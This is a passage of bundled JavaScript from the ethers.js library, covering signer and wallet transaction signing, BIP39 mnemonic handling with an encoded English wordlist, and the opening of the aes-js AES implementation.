        pop.chainId = network.chainId;
      }
      const hasEip1559 = pop.maxFeePerGas != null || pop.maxPriorityFeePerGas != null;
      if (pop.gasPrice != null && (pop.type === 2 || hasEip1559)) {
        assertArgument(false, "eip-1559 transaction do not support gasPrice", "tx", tx);
      } else if ((pop.type === 0 || pop.type === 1) && hasEip1559) {
        assertArgument(false, "pre-eip-1559 transaction do not support maxFeePerGas/maxPriorityFeePerGas", "tx", tx);
      }
      if ((pop.type === 2 || pop.type == null) && (pop.maxFeePerGas != null && pop.maxPriorityFeePerGas != null)) {
        pop.type = 2;
      } else if (pop.type === 0 || pop.type === 1) {
        const feeData = await provider.getFeeData();
        assert(feeData.gasPrice != null, "network does not support gasPrice", "UNSUPPORTED_OPERATION", {
          operation: "getGasPrice"
        });
        if (pop.gasPrice == null) {
          pop.gasPrice = feeData.gasPrice;
        }
      } else {
        const feeData = await provider.getFeeData();
        if (pop.type == null) {
          if (feeData.maxFeePerGas != null && feeData.maxPriorityFeePerGas != null) {
            if (pop.authorizationList && pop.authorizationList.length) {
              pop.type = 4;
            } else {
              pop.type = 2;
            }
            if (pop.gasPrice != null) {
              const gasPrice = pop.gasPrice;
              delete pop.gasPrice;
              pop.maxFeePerGas = gasPrice;
              pop.maxPriorityFeePerGas = gasPrice;
            } else {
              if (pop.maxFeePerGas == null) {
                pop.maxFeePerGas = feeData.maxFeePerGas;
              }
              if (pop.maxPriorityFeePerGas == null) {
                pop.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
              }
            }
          } else if (feeData.gasPrice != null) {
            assert(!hasEip1559, "network does not support EIP-1559", "UNSUPPORTED_OPERATION", {
              operation: "populateTransaction"
            });
            if (pop.gasPrice == null) {
              pop.gasPrice = feeData.gasPrice;
            }
            pop.type = 0;
          } else {
            assert(false, "failed to get consistent fee data", "UNSUPPORTED_OPERATION", {
              operation: "signer.getFeeData"
            });
          }
        } else if (pop.type === 2 || pop.type === 3 || pop.type === 4) {
          if (pop.maxFeePerGas == null) {
            pop.maxFeePerGas = feeData.maxFeePerGas;
          }
          if (pop.maxPriorityFeePerGas == null) {
            pop.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
          }
        }
      }
      return await resolveProperties(pop);
    }
    async populateAuthorization(_auth) {
      const auth = Object.assign({}, _auth);
      if (auth.chainId == null) {
        auth.chainId = (await checkProvider(this, "getNetwork").getNetwork()).chainId;
      }
      if (auth.nonce == null) {
        auth.nonce = await this.getNonce();
      }
      return auth;
    }
    async estimateGas(tx) {
      return checkProvider(this, "estimateGas").estimateGas(await this.populateCall(tx));
    }
    async call(tx) {
      return checkProvider(this, "call").call(await this.populateCall(tx));
    }
    async resolveName(name) {
      const provider = checkProvider(this, "resolveName");
      return await provider.resolveName(name);
    }
    async sendTransaction(tx) {
      const provider = checkProvider(this, "sendTransaction");
      const pop = await this.populateTransaction(tx);
      delete pop.from;
      const txObj = Transaction.from(pop);
      return await provider.broadcastTransaction(await this.signTransaction(txObj));
    }
    // @TODO: in v7 move this to be abstract
    authorize(authorization) {
      assert(false, "authorization not implemented for this signer", "UNSUPPORTED_OPERATION", { operation: "authorize" });
    }
  };
  var VoidSigner = class _VoidSigner extends AbstractSigner {
    /**
     *  The signer address.
     */
    address;
    /**
     *  Creates a new **VoidSigner** with %%address%% attached to
     *  %%provider%%.
     */
    constructor(address, provider) {
      super(provider);
      defineProperties(this, { address });
    }
    async getAddress() {
      return this.address;
    }
    connect(provider) {
      return new _VoidSigner(this.address, provider);
    }
    #throwUnsupported(suffix, operation) {
      assert(false, `VoidSigner cannot sign ${suffix}`, "UNSUPPORTED_OPERATION", { operation });
    }
    async signTransaction(tx) {
      this.#throwUnsupported("transactions", "signTransaction");
    }
    async signMessage(message) {
      this.#throwUnsupported("messages", "signMessage");
    }
    async signTypedData(domain, types, value) {
      this.#throwUnsupported("typed-data", "signTypedData");
    }
  };

  // node_modules/ethers/lib.esm/wallet/base-wallet.js
  var BaseWallet = class _BaseWallet extends AbstractSigner {
    /**
     *  The wallet address.
     */
    address;
    #signingKey;
    /**
     *  Creates a new BaseWallet for %%privateKey%%, optionally
     *  connected to %%provider%%.
     *
     *  If %%provider%% is not specified, only offline methods can
     *  be used.
     */
    constructor(privateKey, provider) {
      super(provider);
      assertArgument(privateKey && typeof privateKey.sign === "function", "invalid private key", "privateKey", "[ REDACTED ]");
      this.#signingKey = privateKey;
      const address = computeAddress(this.signingKey.publicKey);
      defineProperties(this, { address });
    }
    // Store private values behind getters to reduce visibility
    // in console.log
    /**
     *  The [[SigningKey]] used for signing payloads.
     */
    get signingKey() {
      return this.#signingKey;
    }
    /**
     *  The private key for this wallet.
     */
    get privateKey() {
      return this.signingKey.privateKey;
    }
    async getAddress() {
      return this.address;
    }
    connect(provider) {
      return new _BaseWallet(this.#signingKey, provider);
    }
    async signTransaction(tx) {
      tx = copyRequest(tx);
      const { to, from } = await resolveProperties({
        to: tx.to ? resolveAddress(tx.to, this) : void 0,
        from: tx.from ? resolveAddress(tx.from, this) : void 0
      });
      if (to != null) {
        tx.to = to;
      }
      if (from != null) {
        tx.from = from;
      }
      if (tx.from != null) {
        assertArgument(getAddress(tx.from) === this.address, "transaction from address mismatch", "tx.from", tx.from);
        delete tx.from;
      }
      const btx = Transaction.from(tx);
      btx.signature = this.signingKey.sign(btx.unsignedHash);
      return btx.serialized;
    }
    async signMessage(message) {
      return this.signMessageSync(message);
    }
    // @TODO: Add a secialized signTx and signTyped sync that enforces
    // all parameters are known?
    /**
     *  Returns the signature for %%message%% signed with this wallet.
     */
    signMessageSync(message) {
      return this.signingKey.sign(hashMessage(message)).serialized;
    }
    /**
     *  Returns the Authorization for %%auth%%.
     */
    authorizeSync(auth) {
      assertArgument(typeof auth.address === "string", "invalid address for authorizeSync", "auth.address", auth);
      const signature = this.signingKey.sign(hashAuthorization(auth));
      return Object.assign({}, {
        address: getAddress(auth.address),
        nonce: getBigInt(auth.nonce || 0),
        chainId: getBigInt(auth.chainId || 0)
      }, { signature });
    }
    /**
     *  Resolves to the Authorization for %%auth%%.
     */
    async authorize(auth) {
      auth = Object.assign({}, auth, {
        address: await resolveAddress(auth.address, this)
      });
      return this.authorizeSync(await this.populateAuthorization(auth));
    }
    async signTypedData(domain, types, value) {
      const populated = await TypedDataEncoder.resolveNames(domain, types, value, async (name) => {
        assert(this.provider != null, "cannot resolve ENS names without a provider", "UNSUPPORTED_OPERATION", {
          operation: "resolveName",
          info: { name }
        });
        const address = await this.provider.resolveName(name);
        assert(address != null, "unconfigured ENS name", "UNCONFIGURED_NAME", {
          value: name
        });
        return address;
      });
      return this.signingKey.sign(TypedDataEncoder.hash(populated.domain, types, populated.value)).serialized;
    }
  };

  // node_modules/ethers/lib.esm/wordlists/decode-owl.js
  var subsChrs = " !#$%&'()*+,-./<=>?@[]^_`{|}~";
  var Word = /^[a-z]*$/i;
  function unfold(words2, sep) {
    let initial = 97;
    return words2.reduce((accum, word) => {
      if (word === sep) {
        initial++;
      } else if (word.match(Word)) {
        accum.push(String.fromCharCode(initial) + word);
      } else {
        initial = 97;
        accum.push(word);
      }
      return accum;
    }, []);
  }
  function decode(data, subs) {
    for (let i = subsChrs.length - 1; i >= 0; i--) {
      data = data.split(subsChrs[i]).join(subs.substring(2 * i, 2 * i + 2));
    }
    const clumps = [];
    const leftover = data.replace(/(:|([0-9])|([A-Z][a-z]*))/g, (all, item, semi, word) => {
      if (semi) {
        for (let i = parseInt(semi); i >= 0; i--) {
          clumps.push(";");
        }
      } else {
        clumps.push(item.toLowerCase());
      }
      return "";
    });
    if (leftover) {
      throw new Error(`leftovers: ${JSON.stringify(leftover)}`);
    }
    return unfold(unfold(clumps, ";"), ":");
  }
  function decodeOwl(data) {
    assertArgument(data[0] === "0", "unsupported auwl data", "data", data);
    return decode(data.substring(1 + 2 * subsChrs.length), data.substring(1, 1 + 2 * subsChrs.length));
  }

  // node_modules/ethers/lib.esm/wordlists/wordlist.js
  var Wordlist = class {
    locale;
    /**
     *  Creates a new Wordlist instance.
     *
     *  Sub-classes MUST call this if they provide their own constructor,
     *  passing in the locale string of the language.
     *
     *  Generally there is no need to create instances of a Wordlist,
     *  since each language-specific Wordlist creates an instance and
     *  there is no state kept internally, so they are safe to share.
     */
    constructor(locale) {
      defineProperties(this, { locale });
    }
    /**
     *  Sub-classes may override this to provide a language-specific
     *  method for spliting %%phrase%% into individual words.
     *
     *  By default, %%phrase%% is split using any sequences of
     *  white-space as defined by regular expressions (i.e. ``/\s+/``).
     */
    split(phrase) {
      return phrase.toLowerCase().split(/\s+/g);
    }
    /**
     *  Sub-classes may override this to provider a language-specific
     *  method for joining %%words%% into a phrase.
     *
     *  By default, %%words%% are joined by a single space.
     */
    join(words2) {
      return words2.join(" ");
    }
  };

  // node_modules/ethers/lib.esm/wordlists/wordlist-owl.js
  var WordlistOwl = class extends Wordlist {
    #data;
    #checksum;
    /**
     *  Creates a new Wordlist for %%locale%% using the OWL %%data%%
     *  and validated against the %%checksum%%.
     */
    constructor(locale, data, checksum2) {
      super(locale);
      this.#data = data;
      this.#checksum = checksum2;
      this.#words = null;
    }
    /**
     *  The OWL-encoded data.
     */
    get _data() {
      return this.#data;
    }
    /**
     *  Decode all the words for the wordlist.
     */
    _decodeWords() {
      return decodeOwl(this.#data);
    }
    #words;
    #loadWords() {
      if (this.#words == null) {
        const words2 = this._decodeWords();
        const checksum2 = id(words2.join("\n") + "\n");
        if (checksum2 !== this.#checksum) {
          throw new Error(`BIP39 Wordlist for ${this.locale} FAILED`);
        }
        this.#words = words2;
      }
      return this.#words;
    }
    getWord(index) {
      const words2 = this.#loadWords();
      assertArgument(index >= 0 && index < words2.length, `invalid word index: ${index}`, "index", index);
      return words2[index];
    }
    getWordIndex(word) {
      return this.#loadWords().indexOf(word);
    }
  };

  // node_modules/ethers/lib.esm/wordlists/lang-en.js
  var words = "0erleonalorenseinceregesticitStanvetearctssi#ch2Athck&tneLl0And#Il.yLeOutO=S|S%b/ra@SurdU'0Ce[Cid|CountCu'Hie=IdOu,-Qui*Ro[TT]T%T*[Tu$0AptDD-tD*[Ju,M.UltV<)Vi)0Rob-0FairF%dRaid0A(EEntRee0Ead0MRRp%tS!_rmBumCoholErtI&LLeyLowMo,O}PhaReadySoT Ways0A>urAz(gOngOuntU'd0Aly,Ch%Ci|G G!GryIm$K!Noun)Nu$O` Sw T&naTiqueXietyY1ArtOlogyPe?P!Pro=Ril1ChCt-EaEnaGueMMedM%MyOundR<+Re,Ri=RowTTefa@Ti,Tw%k0KPe@SaultSetSi,SumeThma0H!>OmTa{T&dT.udeTra@0Ct]D.Gu,NtTh%ToTumn0Era+OcadoOid0AkeA*AyEsomeFulKw?d0Is:ByChel%C#D+GL<)Lc#y~MbooN<aNn RRelyRga(R*lSeS-SketTt!3A^AnAutyCau'ComeEfF%eG(Ha=H(dLie=LowLtN^Nef./TrayTt Twe&Y#d3Cyc!DKeNdOlogyRdR`Tt _{AdeAmeAnketA,EakE[IndOodO[omOu'UeUrUsh_rdAtDyIlMbNeNusOkO,Rd R(gRrowSsTtomUn)XY_{etA(AndA[A=EadEezeI{Id+IefIghtIngIskOccoliOk&OnzeOomO` OwnUsh2Bb!DdyD+tFf$oIldLbLkL!tNd!Nk Rd&Rg R,SS(e[SyTt Y Zz:Bba+B(B!CtusGeKe~LmM aMpNN$N)lNdyNn#NoeNvasNy#Pab!P.$Pta(RRb#RdRgoRpetRryRtSeShS(o/!Su$TT$ogT^Teg%yTt!UghtU'Ut]Ve3Il(gL yM|NsusNturyRe$Rta(_irAlkAmp]An+AosApt Ar+A'AtEapE{Ee'EfErryE,I{&IefIldIm}yOi)Oo'R#-U{!UnkUrn0G?Nnam#Rc!Tiz&TyVil_imApArifyAwAyE<ErkEv I{I|IffImbIn-IpO{OgO'O`OudOwnUbUmpU, Ut^_^A,C#utDeFfeeIlInL!@L%LumnMb(eMeMf%tM-Mm#Mp<yNc tNdu@NfirmNg*[N}@Nsid NtrolNv()OkOlPp PyR$ReRnR*@/Tt#U^UntryUp!Ur'Us(V Yo>_{Ad!AftAmA}AshAt AwlAzyEamEd.EekEwI{etImeIspIt-OpO[Ou^OwdUci$UelUi'Umb!Un^UshYY,$2BeLtu*PPbo?dRiousRr|Rta(R=Sh]/omTe3C!:DMa+MpN)Ng R(gShUght WnY3AlBa>BrisCadeCemb CideCl(eC%a>C*a'ErF&'F(eFyG*eLayLiv M<dMi'Ni$Nti,NyP?tP&dPos.P`PutyRi=ScribeS tSignSkSpair/royTailTe@VelopVi)Vo>3AgramAlAm#dAryCeE'lEtFf G.$Gn.yLemmaNn NosaurRe@RtSag*eScov Sea'ShSmi[S%d Splay/<)V tVideV%)Zzy5Ct%Cum|G~Lph(Ma(Na>NkeyN%OrSeUb!Ve_ftAg#AmaA,-AwEamE[IftIllInkIpI=OpUmY2CkMbNeR(g/T^Ty1Arf1Nam-:G G!RlyRnR`Sily/Sy1HoOlogyOnomy0GeItUca>1F%t0G1GhtTh 2BowD E@r-Eg<tEm|Eph<tEvat%I>Se0B?kBodyBra)Er+Ot]PloyPow Pty0Ab!A@DD![D%'EmyErgyF%)Ga+G(eH<)JoyLi,OughR-hRollSu*T Ti*TryVelope1Isode0U$Uip0AA'OdeOs]R%Upt0CapeSayS&)Ta>0Ern$H-s1Id&)IlOkeOl=1A@Amp!Ce[Ch<+C.eCludeCu'Ecu>Erci'Hau,Hib.I!I,ItOt-P<dPe@Pi*Pla(Po'P*[T&dTra0EEbrow:Br-CeCultyDeIntI`~L'MeMilyMousNNcyNtasyRmSh]TT$Th TigueUltV%.e3Atu*Bru?yD $EEdElMa!N)/iv$T^V W3B Ct]EldGu*LeLmLt N$NdNeNg NishReRmR,Sc$ShTT}[X_gAmeAshAtAv%EeIghtIpOatO{O%Ow UidUshY_mCusGIlLd~owOdOtR)Re,R+tRkRtu}RumRw?dSsil/ UndX_gi!AmeEqu|EshI&dIn+OgOntO,OwnOz&U.2ElNNnyRna)RyTu*:D+tInLaxy~ yMePRa+Rba+Rd&Rl-Rm|SSpTeTh U+Ze3N $NiusN*Nt!Nu(e/u*2O,0AntFtGg!Ng RaffeRlVe_dAn)A*A[IdeImp'ObeOomOryO=OwUe_tDde[LdOdO'RillaSpelSsipV nWn_bA)A(AntApeA[Av.yEatE&IdIefItOc yOupOwUnt_rdE[IdeIltIt?N3M:B.IrLfMm M, NdPpyRb%RdRshR=,TVeWkZ?d3AdAl`ArtAvyD+hogIght~oLmetLpNRo3Dd&Gh~NtPRe/%y5BbyCkeyLdLeLiday~owMeNeyOdPeRnRr%R'Sp.$/TelUrV 5BGeM<Mb!M%Nd*dNgryNtRd!RryRtSb<d3Brid:1EOn0EaEntifyLe2N%e4LLeg$L}[0A+Ita>M&'Mu}Pa@Po'Pro=Pul'0ChCludeComeC*a'DexD-a>Do%Du,ryF<tFl-tF%mHa!H .Iti$Je@JuryMa>N Noc|PutQuiryS<eSe@SideSpi*/$lTa@T e,ToVe,V.eVol=3On0L<dOla>Sue0Em1Ory:CketGu?RZz3AlousAns~yWel9BInKeUr}yY5D+I)MpNg!Ni%Nk/:Ng?oo3EnEpT^upY3CkDD}yNdNgdomSsTT^&TeTt&Wi4EeIfeO{Ow:BBelB%Dd DyKeMpNgua+PtopR+T T(UghUndryVaWWnWsu.Y Zy3Ad AfArnA=Ctu*FtGG$G&dIsu*M#NdNg`NsOp?dSs#Tt Vel3ArB tyBr?yC&'FeFtGhtKeMbM.NkOnQuid/Tt!VeZ?d5AdAnB, C$CkG-NelyNgOpTt yUdUn+VeY$5CkyGga+Mb N?N^Xury3R-s:Ch(eDG-G}tIdIlInJ%KeMm$NNa+Nda>NgoNs]Nu$P!Rb!R^Rg(R(eRketRria+SkSs/ T^T i$ThTrixTt XimumZe3AdowAnAsu*AtCh<-D$DiaLodyLtMb M%yNt]NuRcyR+R.RryShSsa+T$Thod3Dd!DnightLk~]M-NdNimumN%Nu>Rac!Rr%S ySs/akeXXedXtu*5Bi!DelDifyMM|N.%NkeyN, N`OnR$ReRn(gSqu.oTh T]T%Unta(U'VeVie5ChFf(LeLtiplySc!SeumShroomS-/Tu$3Self/ yTh:I=MePk(Rrow/yT]Tu*3ArCkEdGati=G!@I` PhewR=/TTw%kUtr$V WsXt3CeGht5B!I'M(eeOd!Rm$R`SeTab!TeTh(gTi)VelW5C!?Mb R'T:K0EyJe@Li+Scu*S =Ta(Vious0CurE<Tob 0Or1FF Fi)T&2L1Ay0DI=Ymp-0It0CeEI#L(eLy1EnEraIn]Po'T]1An+B.Ch?dD D(?yG<I|Ig($Ph<0Tr-h0H 0Tdo%T TputTside0AlEnEr0NN 0Yg&0/ 0O}:CtDd!GeIrLa)LmNdaNelN-N` P RadeR|RkRrotRtySsT^ThTi|TrolTt nU'VeYm|3A)AnutArAs<tL-<NN$tyNcilOp!Pp Rfe@Rm.Rs#T2O}OtoRa'Ys-$0AnoCn-Ctu*E)GGe#~LotNkO} Pe/olT^Zza_)A}tA,-A>AyEa'Ed+U{UgUn+2EmEtIntL?LeLi)NdNyOlPul?Rt]S.]Ssib!/TatoTt yV tyWd W _@i)Ai'Ed-tEf Epa*Es|EttyEv|I)IdeIm?yIntI%.yIs#Iva>IzeOb!mO)[Odu)Of.OgramOje@Omo>OofOp tyOsp O>@OudOvide2Bl-Dd(g~LpL'Mpk(N^PilPpyR^a'R.yRpo'R'ShTZz!3Ramid:99Al.yAntumArt E,]I{ItIzO>:Bb.Cco#CeCkD?DioIlInI'~yMpN^NdomN+PidReTeTh V&WZ%3AdyAlAs#BelBuildC$lCei=CipeC%dCyc!Du)F!@F%mFu'G]G*tGul?Je@LaxLea'LiefLyMa(Memb M(dMo=Nd NewNtOp&PairPeatPla)P%tQui*ScueSemb!Si,Sour)Sp#'SultTi*T*atTurnUn]Ve$ViewW?d2Y`m0BBb#CeChDeD+F!GhtGidNgOtPp!SkTu$V$V 5AdA,BotBu,CketM<)OfOkieOmSeTa>UghUndU>Y$5Bb DeGLeNNwayR$:DDd!D}[FeIlLadLm#L#LtLu>MeMp!NdTisfyToshiU)Usa+VeY1A!AnA*Att E}HemeHoolI&)I[%sOrp]OutRapRe&RiptRub1AAr^As#AtC#dC*tCt]Cur.yEdEkGm|Le@~M(?Ni%N'Nt&)RiesRvi)Ss]Tt!TupV&_dowAftAllowA*EdEllEriffIeldIftI}IpIv O{OeOotOpOrtOuld O=RimpRugUff!Y0Bl(gCkDeE+GhtGnL|Lk~yLv Mil?Mp!N)NgR&/ Tua>XZe1A>Et^IIllInIrtUll0AbAmEepEnd I)IdeIghtImOg<OtOwUsh0AllArtI!OkeOo`0A{AkeApIffOw0ApCc Ci$CkDaFtL?Ldi LidLut]L=Me#eNgOnRryRtUlUndUpUr)U`0A)A*Ati$AwnEakEci$EedEllEndH eI)Id IkeInIr.L.OilOns%O#OrtOtRayReadR(gY0Ua*UeezeUir*l_b!AdiumAffA+AirsAmpAndArtA>AyEakEelEmEpE*oI{IllIngO{Oma^O}OolOryO=Ra>gyReetRikeR#gRugg!Ud|UffUmb!Y!0Bje@Bm.BwayC)[ChDd&Ff G?G+,ItMm NNnyN'tP PplyP*meReRfa)R+Rpri'RroundR=ySpe@/a(1AllowAmpApArmE?EetIftImIngIt^Ord1MbolMptomRup/em:B!Ck!GIlL|LkNkPeR+tSk/eTtooXi3A^Am~NN<tNnisNtRm/Xt_nkAtEmeEnE%yE*EyIngIsOughtReeRi=RowUmbUnd 0CketDeG LtMb MeNyPRedSsueT!5A,BaccoDayDdl EGe` I!tK&MatoM%rowNeNgueNightOlO`PP-Pp!R^RnadoRtoi'SsT$Uri,W?dW WnY_{AdeAff-Ag-A(Ansf ApAshA=lAyEatEeEndI$IbeI{Igg ImIpOphyOub!U{UeUlyUmpetU,U`Y2BeIt]Mb!NaN}lRkeyRnRt!1El=EntyI)InI,O1PeP-$:5Ly5B*lla0Ab!Awa*C!Cov D DoFairFoldHappyIf%mIqueItIv 'KnownLo{TilUsu$Veil1Da>GradeHoldOnP Set1B<Ge0A+EEdEfulE![U$0Il.y:C<tCuumGueLidL!yL=NNishP%Rious/Ult3H-!L=tNd%Ntu*NueRbRifyRs]RyS'lT <3Ab!Br<tCiousCt%yDeoEw~a+Nta+Ol(Rtu$RusSaS.Su$T$Vid5C$I)IdLc<oLumeTeYa+:GeG#ItLk~LnutNtRfa*RmRri%ShSp/eT VeY3Al`Ap#ArA'lA` BDd(gEk&dIrdLcome/T_!AtEatEelEnE*IpIsp 0DeD`FeLd~NNdowNeNgNkNn Nt ReSdomSeShT}[5LfM<Nd OdOlRdRkRldRryR`_pE{E,!I,I>Ong::Rd3Ar~ow9UUngU`:3BraRo9NeO";
  var checksum = "0x3c8acc1e7b08d8e76f9fda015ef48dc8c710a73cb7e0f77b2c18a9b5a7adde60";
  var wordlist = null;
  var LangEn = class _LangEn extends WordlistOwl {
    /**
     *  Creates a new instance of the English language Wordlist.
     *
     *  This should be unnecessary most of the time as the exported
     *  [[langEn]] should suffice.
     *
     *  @_ignore:
     */
    constructor() {
      super("en", words, checksum);
    }
    /**
     *  Returns a singleton instance of a ``LangEn``, creating it
     *  if this is the first time being called.
     */
    static wordlist() {
      if (wordlist == null) {
        wordlist = new _LangEn();
      }
      return wordlist;
    }
  };

  // node_modules/ethers/lib.esm/wallet/mnemonic.js
  function getUpperMask(bits) {
    return (1 << bits) - 1 << 8 - bits & 255;
  }
  function getLowerMask(bits) {
    return (1 << bits) - 1 & 255;
  }
  function mnemonicToEntropy(mnemonic, wordlist2) {
    assertNormalize("NFKD");
    if (wordlist2 == null) {
      wordlist2 = LangEn.wordlist();
    }
    const words2 = wordlist2.split(mnemonic);
    assertArgument(words2.length % 3 === 0 && words2.length >= 12 && words2.length <= 24, "invalid mnemonic length", "mnemonic", "[ REDACTED ]");
    const entropy = new Uint8Array(Math.ceil(11 * words2.length / 8));
    let offset = 0;
    for (let i = 0; i < words2.length; i++) {
      let index = wordlist2.getWordIndex(words2[i].normalize("NFKD"));
      assertArgument(index >= 0, `invalid mnemonic word at index ${i}`, "mnemonic", "[ REDACTED ]");
      for (let bit = 0; bit < 11; bit++) {
        if (index & 1 << 10 - bit) {
          entropy[offset >> 3] |= 1 << 7 - offset % 8;
        }
        offset++;
      }
    }
    const entropyBits = 32 * words2.length / 3;
    const checksumBits = words2.length / 3;
    const checksumMask = getUpperMask(checksumBits);
    const checksum2 = getBytes(sha2562(entropy.slice(0, entropyBits / 8)))[0] & checksumMask;
    assertArgument(checksum2 === (entropy[entropy.length - 1] & checksumMask), "invalid mnemonic checksum", "mnemonic", "[ REDACTED ]");
    return hexlify(entropy.slice(0, entropyBits / 8));
  }
  function entropyToMnemonic(entropy, wordlist2) {
    assertArgument(entropy.length % 4 === 0 && entropy.length >= 16 && entropy.length <= 32, "invalid entropy size", "entropy", "[ REDACTED ]");
    if (wordlist2 == null) {
      wordlist2 = LangEn.wordlist();
    }
    const indices = [0];
    let remainingBits = 11;
    for (let i = 0; i < entropy.length; i++) {
      if (remainingBits > 8) {
        indices[indices.length - 1] <<= 8;
        indices[indices.length - 1] |= entropy[i];
        remainingBits -= 8;
      } else {
        indices[indices.length - 1] <<= remainingBits;
        indices[indices.length - 1] |= entropy[i] >> 8 - remainingBits;
        indices.push(entropy[i] & getLowerMask(8 - remainingBits));
        remainingBits += 3;
      }
    }
    const checksumBits = entropy.length / 4;
    const checksum2 = parseInt(sha2562(entropy).substring(2, 4), 16) & getUpperMask(checksumBits);
    indices[indices.length - 1] <<= checksumBits;
    indices[indices.length - 1] |= checksum2 >> 8 - checksumBits;
    return wordlist2.join(indices.map((index) => wordlist2.getWord(index)));
  }
  var _guard2 = {};
  var Mnemonic = class _Mnemonic {
    /**
     *  The mnemonic phrase of 12, 15, 18, 21 or 24 words.
     *
     *  Use the [[wordlist]] ``split`` method to get the individual words.
     */
    phrase;
    /**
     *  The password used for this mnemonic. If no password is used this
     *  is the empty string (i.e. ``""``) as per the specification.
     */
    password;
    /**
     *  The wordlist for this mnemonic.
     */
    wordlist;
    /**
     *  The underlying entropy which the mnemonic encodes.
     */
    entropy;
    /**
     *  @private
     */
    constructor(guard, entropy, phrase, password, wordlist2) {
      if (password == null) {
        password = "";
      }
      if (wordlist2 == null) {
        wordlist2 = LangEn.wordlist();
      }
      assertPrivate(guard, _guard2, "Mnemonic");
      defineProperties(this, { phrase, password, wordlist: wordlist2, entropy });
    }
    /**
     *  Returns the seed for the mnemonic.
     */
    computeSeed() {
      const salt = toUtf8Bytes("mnemonic" + this.password, "NFKD");
      return pbkdf22(toUtf8Bytes(this.phrase, "NFKD"), salt, 2048, 64, "sha512");
    }
    /**
     *  Creates a new Mnemonic for the %%phrase%%.
     *
     *  The default %%password%% is the empty string and the default
     *  wordlist is the [English wordlists](LangEn).
     */
    static fromPhrase(phrase, password, wordlist2) {
      const entropy = mnemonicToEntropy(phrase, wordlist2);
      phrase = entropyToMnemonic(getBytes(entropy), wordlist2);
      return new _Mnemonic(_guard2, entropy, phrase, password, wordlist2);
    }
    /**
     *  Create a new **Mnemonic** from the %%entropy%%.
     *
     *  The default %%password%% is the empty string and the default
     *  wordlist is the [English wordlists](LangEn).
     */
    static fromEntropy(_entropy, password, wordlist2) {
      const entropy = getBytes(_entropy, "entropy");
      const phrase = entropyToMnemonic(entropy, wordlist2);
      return new _Mnemonic(_guard2, hexlify(entropy), phrase, password, wordlist2);
    }
    /**
     *  Returns the phrase for %%mnemonic%%.
     */
    static entropyToPhrase(_entropy, wordlist2) {
      const entropy = getBytes(_entropy, "entropy");
      return entropyToMnemonic(entropy, wordlist2);
    }
    /**
     *  Returns the entropy for %%phrase%%.
     */
    static phraseToEntropy(phrase, wordlist2) {
      return mnemonicToEntropy(phrase, wordlist2);
    }
    /**
     *  Returns true if %%phrase%% is a valid [[link-bip-39]] phrase.
     *
     *  This checks all the provided words belong to the %%wordlist%%,
     *  that the length is valid and the checksum is correct.
     */
    static isValidMnemonic(phrase, wordlist2) {
      try {
        mnemonicToEntropy(phrase, wordlist2);
        return true;
      } catch (error) {
      }
      return false;
    }
  };

  // node_modules/aes-js/lib.esm/aes.js
  var __classPrivateFieldGet = function(receiver, state, kind, f2) {
    if (kind === "a" && !f2) throw new TypeError("Private accessor was defined without a getter");
    if (typeof state === "function" ? receiver !== state || !f2 : !state.has(receiver)) throw new TypeError("Cannot read private member from an object whose class did not declare it");
    return kind === "m" ? f2 : kind === "a" ? f2.call(receiver) : f2 ? f2.value : state.get(receiver);
  };
  var __classPrivateFieldSet = function(receiver, state, value, kind, f2) {
    if (kind === "m") throw new TypeError("Private method is not writable");
    if (kind === "a" && !f2) throw new TypeError("Private accessor was defined without a setter");
    if (typeof state === "function" ? receiver !== state || !f2 : !state.has(receiver)) throw new TypeError("Cannot write private member to an object whose class did not declare it");
    return kind === "a" ? f2.call(receiver, value) : f2 ? f2.value = value : state.set(receiver, value), value;
  };
  var _AES_key;
  var _AES_Kd;
  var _AES_Ke;
  var numberOfRounds = { 16: 10, 24: 12, 32: 14 };
  var rcon = [1, 2, 4, 8, 16, 32, 64, 128, 27, 54, 108, 216, 171, 77, 154, 47, 94, 188, 99, 198, 151, 53, 106, 212, 179, 125, 250, 239, 197, 145];
  var S = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22];
